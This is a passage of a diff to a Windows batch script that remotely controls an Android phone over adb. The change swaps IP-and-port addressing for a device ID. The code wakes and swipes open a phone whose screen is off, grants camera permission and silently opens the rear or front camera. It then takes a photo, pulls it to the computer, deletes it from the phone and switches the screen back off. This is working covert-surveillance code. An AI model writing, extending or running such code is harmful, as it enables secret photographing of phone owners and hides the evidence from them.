+    adb -s %DEVICE_ID% shell input swipe 540 1600 540 800 300 >nul 2>&1
     timeout /t 1 >nul
 )
 
@@ -843,7 +771,7 @@ echo  [*] Detecting camera package...
 set "CAM_PKG="
 for %%P in (com.miui.camera com.sec.android.app.camera com.oneplus.camera com.android.camera2 com.android.camera org.codeaurora.snapcam) do (
     if "!CAM_PKG!"=="" (
-        adb -s %IP_ADDR%:%PORT_TARGET% shell pm list packages | findstr /i "%%P" >nul 2>&1
+        adb -s %DEVICE_ID% shell pm list packages | findstr /i "%%P" >nul 2>&1
         if not errorlevel 1 set "CAM_PKG=%%P"
     )
 )
@@ -851,17 +779,17 @@ if "!CAM_PKG!"=="" set "CAM_PKG=com.android.camera2"
 echo  [*] Using: !CAM_PKG!
 
 :: -- Grant camera permission to that package only --
-adb -s %IP_ADDR%:%PORT_TARGET% shell pm grant !CAM_PKG! android.permission.CAMERA >nul 2>&1
-adb -s %IP_ADDR%:%PORT_TARGET% shell appops set !CAM_PKG! CAMERA allow >nul 2>&1
+adb -s %DEVICE_ID% shell pm grant !CAM_PKG! android.permission.CAMERA >nul 2>&1
+adb -s %DEVICE_ID% shell appops set !CAM_PKG! CAMERA allow >nul 2>&1
 
 :: -- Place timestamp marker BEFORE opening camera --
-adb -s %IP_ADDR%:%PORT_TARGET% shell "touch /sdcard/.snap_marker" >nul 2>&1
+adb -s %DEVICE_ID% shell "touch /sdcard/.snap_marker" >nul 2>&1
 
 :: -- Launch rear camera: monkey is most reliable cross-OEM launcher --
 echo  [*] Opening Rear Camera...
-adb -s %IP_ADDR%:%PORT_TARGET% shell "am force-stop !CAM_PKG!" >nul 2>&1
+adb -s %DEVICE_ID% shell "am force-stop !CAM_PKG!" >nul 2>&1
 timeout /t 1 >nul
-adb -s %IP_ADDR%:%PORT_TARGET% shell "am start -a android.media.action.STILL_IMAGE_CAMERA -p !CAM_PKG!" >nul 2>&1
+adb -s %DEVICE_ID% shell "am start -a android.media.action.STILL_IMAGE_CAMERA -p !CAM_PKG!" >nul 2>&1
 
 :: -- Verify camera is actually in foreground before shuttering --
 echo  [*] Waiting for camera to open...
@@ -869,14 +797,14 @@ set "CAM_OPEN=0"
 for /l %%W in (1,1,10) do (
     if "!CAM_OPEN!"=="0" (
         timeout /t 1 >nul
-        adb -s %IP_ADDR%:%PORT_TARGET% shell "dumpsys window windows | grep mCurrentFocus" 2^>nul | findstr /i "!CAM_PKG!" >nul 2>&1
+        adb -s %DEVICE_ID% shell "dumpsys window windows | grep mCurrentFocus" 2^>nul | findstr /i "!CAM_PKG!" >nul 2>&1
         if not errorlevel 1 set "CAM_OPEN=1"
     )
 )
 if "!CAM_OPEN!"=="0" (
     echo  [!] Camera did not open — aborting to avoid wrong photo.
-    adb -s %IP_ADDR%:%PORT_TARGET% shell "rm /sdcard/.snap_marker" >nul 2>&1
-    if "!SCREEN_WAS_OFF!"=="1" adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26 >nul 2>&1
+    adb -s %DEVICE_ID% shell "rm /sdcard/.snap_marker" >nul 2>&1
+    if "!SCREEN_WAS_OFF!"=="1" adb -s %DEVICE_ID% shell input keyevent 26 >nul 2>&1
     pause
     goto MODULE_PHONE_ACTIONS
 )
@@ -885,27 +813,27 @@ timeout /t 3 >nul
 
 :: -- Fire shutter --
 echo  [*] Sending shutter...
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 27 >nul 2>&1
+adb -s %DEVICE_ID% shell input keyevent 27 >nul 2>&1
 timeout /t 1 >nul
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 24 >nul 2>&1
+adb -s %DEVICE_ID% shell input keyevent 24 >nul 2>&1
 timeout /t 4 >nul
 
 :: -- Close camera app --
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 3 >nul 2>&1
+adb -s %DEVICE_ID% shell input keyevent 3 >nul 2>&1
 
 :: -- Locate new photo (timestamp-based, parentheses fix the -o precedence bug) --
 echo  [*] Locating captured photo...
 set "PHO_FILE="
-for /f "tokens=*" %%a in ('adb -s %IP_ADDR%:%PORT_TARGET% shell "find /sdcard/DCIM -newer /sdcard/.snap_marker \( -name '*.jpg' -o -name '*.jpeg' \) 2>/dev/null | head -1"') do set "PHO_FILE=%%a"
+for /f "tokens=*" %%a in ('adb -s %DEVICE_ID% shell "find /sdcard/DCIM -newer /sdcard/.snap_marker \( -name '*.jpg' -o -name '*.jpeg' \) 2>/dev/null | head -1"') do set "PHO_FILE=%%a"
 for /f "tokens=1" %%a in ("!PHO_FILE!") do set "PHO_FILE=%%a"
-adb -s %IP_ADDR%:%PORT_TARGET% shell "rm /sdcard/.snap_marker" >nul 2>&1
+adb -s %DEVICE_ID% shell "rm /sdcard/.snap_marker" >nul 2>&1
 
 if not "!PHO_FILE!"=="" (
     echo  [*] Pulling: !PHO_FILE!
     echo  -----------------------------------------------
-    adb -s %IP_ADDR%:%PORT_TARGET% pull "!PHO_FILE!" Photos
+    adb -s %DEVICE_ID% pull "!PHO_FILE!" Photos
     if not errorlevel 1 (
-        adb -s %IP_ADDR%:%PORT_TARGET% shell rm "!PHO_FILE!" >nul 2>&1
+        adb -s %DEVICE_ID% shell rm "!PHO_FILE!" >nul 2>&1
         echo  -----------------------------------------------
         echo  [+] Photo saved to: %CD%\Photos\ and deleted from device.
         start "" explorer "%CD%\Photos"
@@ -917,7 +845,7 @@ if not "!PHO_FILE!"=="" (
 )
 if "!SCREEN_WAS_OFF!"=="1" (
     echo  [*] Restoring screen to off...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26 >nul 2>&1
+    adb -s %DEVICE_ID% shell input keyevent 26 >nul 2>&1
 )
 pause
 goto MODULE_PHONE_ACTIONS
@@ -929,17 +857,17 @@ if not exist "Photos" mkdir "Photos"
 
 :: -- Check if screen is currently off --
 set "SCREEN_WAS_OFF=0"
-for /f "tokens=*" %%a in ('adb -s %IP_ADDR%:%PORT_TARGET% shell "dumpsys power | grep mWakefulness=" 2^>nul') do set "WAKE_RAW=%%a"
+for /f "tokens=*" %%a in ('adb -s %DEVICE_ID% shell "dumpsys power | grep mWakefulness=" 2^>nul') do set "WAKE_RAW=%%a"
 echo !WAKE_RAW! | findstr /i "Asleep Dozing" >nul 2>&1
 if not errorlevel 1 set "SCREEN_WAS_OFF=1"
 
 if "!SCREEN_WAS_OFF!"=="1" (
     echo  [*] Screen is off — waking...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26
+    adb -s %DEVICE_ID% shell input keyevent 26
     timeout /t 2 >nul
-    adb connect %IP_ADDR%:%PORT_TARGET% >nul 2>&1
+    adb connect %DEVICE_ID% >nul 2>&1
     timeout /t 2 >nul
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input swipe 540 1600 540 800 300 >nul 2>&1
+    adb -s %DEVICE_ID% shell input swipe 540 1600 540 800 300 >nul 2>&1
     timeout /t 1 >nul
 )
 
@@ -948,7 +876,7 @@ echo  [*] Detecting camera package...
 set "CAM_PKG="
 for %%P in (com.miui.camera com.sec.android.app.camera com.oneplus.camera com.android.camera2 com.android.camera org.codeaurora.snapcam) do (
     if "!CAM_PKG!"=="" (
-        adb -s %IP_ADDR%:%PORT_TARGET% shell pm list packages | findstr /i "%%P" >nul 2>&1
+        adb -s %DEVICE_ID% shell pm list packages | findstr /i "%%P" >nul 2>&1
         if not errorlevel 1 set "CAM_PKG=%%P"
     )
 )
@@ -956,17 +884,17 @@ if "!CAM_PKG!"=="" set "CAM_PKG=com.android.camera2"
 echo  [*] Using: !CAM_PKG!
 
 :: -- Grant camera permission to that package only --
-adb -s %IP_ADDR%:%PORT_TARGET% shell pm grant !CAM_PKG! android.permission.CAMERA >nul 2>&1
-adb -s %IP_ADDR%:%PORT_TARGET% shell appops set !CAM_PKG! CAMERA allow >nul 2>&1
+adb -s %DEVICE_ID% shell pm grant !CAM_PKG! android.permission.CAMERA >nul 2>&1
+adb -s %DEVICE_ID% shell appops set !CAM_PKG! CAMERA allow >nul 2>&1
 
 :: -- Place timestamp marker BEFORE opening camera --
-adb -s %IP_ADDR%:%PORT_TARGET% shell "touch /sdcard/.snap_marker" >nul 2>&1
+adb -s %DEVICE_ID% shell "touch /sdcard/.snap_marker" >nul 2>&1
 
 :: -- Launch FRONT camera: force-stop first, then SELFIE intent to package --
 echo  [*] Opening Front Camera (Selfie)...
-adb -s %IP_ADDR%:%PORT_TARGET% shell "am force-stop !CAM_PKG!" >nul 2>&1
+adb -s %DEVICE_ID% shell "am force-stop !CAM_PKG!" >nul 2>&1
 timeout /t 1 >nul
-adb -s %IP_ADDR%:%PORT_TARGET% shell "am start -a android.media.action.SELFIE_STILL_IMAGE_CAMERA -p !CAM_PKG!" >nul 2>&1
+adb -s %DEVICE_ID% shell "am start -a android.media.action.SELFIE_STILL_IMAGE_CAMERA -p !CAM_PKG!" >nul 2>&1
 
 :: -- Verify camera is in foreground before shuttering --
 echo  [*] Waiting for camera to open...
@@ -974,14 +902,14 @@ set "CAM_OPEN=0"
 for /l %%W in (1,1,10) do (
     if "!CAM_OPEN!"=="0" (
         timeout /t 1 >nul
-        adb -s %IP_ADDR%:%PORT_TARGET% shell "dumpsys window windows | grep mCurrentFocus" 2^>nul | findstr /i "!CAM_PKG!" >nul 2>&1
+        adb -s %DEVICE_ID% shell "dumpsys window windows | grep mCurrentFocus" 2^>nul | findstr /i "!CAM_PKG!" >nul 2>&1
         if not errorlevel 1 set "CAM_OPEN=1"
     )
 )
 if "!CAM_OPEN!"=="0" (
     echo  [!] Camera did not open — aborting to avoid wrong photo.
-    adb -s %IP_ADDR%:%PORT_TARGET% shell "rm /sdcard/.snap_marker" >nul 2>&1
-    if "!SCREEN_WAS_OFF!"=="1" adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26 >nul 2>&1
+    adb -s %DEVICE_ID% shell "rm /sdcard/.snap_marker" >nul 2>&1
+    if "!SCREEN_WAS_OFF!"=="1" adb -s %DEVICE_ID% shell input keyevent 26 >nul 2>&1
     pause
     goto MODULE_PHONE_ACTIONS
 )
@@ -990,27 +918,27 @@ timeout /t 3 >nul
 
 :: -- Fire shutter --
 echo  [*] Sending shutter...
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 27 >nul 2>&1
+adb -s %DEVICE_ID% shell input keyevent 27 >nul 2>&1
 timeout /t 1 >nul
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 24 >nul 2>&1
+adb -s %DEVICE_ID% shell input keyevent 24 >nul 2>&1
 timeout /t 4 >nul
 
 :: -- Close camera --
-adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 3 >nul 2>&1
+adb -s %DEVICE_ID% shell input keyevent 3 >nul 2>&1
 
 :: -- Locate new photo (parentheses fix -o precedence bug) --
 echo  [*] Locating captured selfie...
 set "PHO_FILE="
-for /f "tokens=*" %%a in ('adb -s %IP_ADDR%:%PORT_TARGET% shell "find /sdcard/DCIM -newer /sdcard/.snap_marker \( -name '*.jpg' -o -name '*.jpeg' \) 2>/dev/null | head -1"') do set "PHO_FILE=%%a"
+for /f "tokens=*" %%a in ('adb -s %DEVICE_ID% shell "find /sdcard/DCIM -newer /sdcard/.snap_marker \( -name '*.jpg' -o -name '*.jpeg' \) 2>/dev/null | head -1"') do set "PHO_FILE=%%a"
 for /f "tokens=1" %%a in ("!PHO_FILE!") do set "PHO_FILE=%%a"
-adb -s %IP_ADDR%:%PORT_TARGET% shell "rm /sdcard/.snap_marker" >nul 2>&1
+adb -s %DEVICE_ID% shell "rm /sdcard/.snap_marker" >nul 2>&1
 
 if not "!PHO_FILE!"=="" (
     echo  [*] Pulling: !PHO_FILE!
     echo  -----------------------------------------------
-    adb -s %IP_ADDR%:%PORT_TARGET% pull "!PHO_FILE!" Photos
+    adb -s %DEVICE_ID% pull "!PHO_FILE!" Photos
     if not errorlevel 1 (
-        adb -s %IP_ADDR%:%PORT_TARGET% shell rm "!PHO_FILE!" >nul 2>&1
+        adb -s %DEVICE_ID% shell rm "!PHO_FILE!" >nul 2>&1
         echo  -----------------------------------------------
         echo  [+] Selfie saved to: %CD%\Photos\ and deleted from device.
         start "" explorer "%CD%\Photos"
@@ -1022,7 +950,7 @@ if not "!PHO_FILE!"=="" (
 )
 if "!SCREEN_WAS_OFF!"=="1" (
     echo  [*] Restoring screen to off...
-    adb -s %IP_ADDR%:%PORT_TARGET% shell input keyevent 26 >nul 2>&1
+    adb -s %DEVICE_ID% shell input keyevent 26 >nul 2>&1
 )
 pause
 goto MODULE_PHONE_ACTIONS
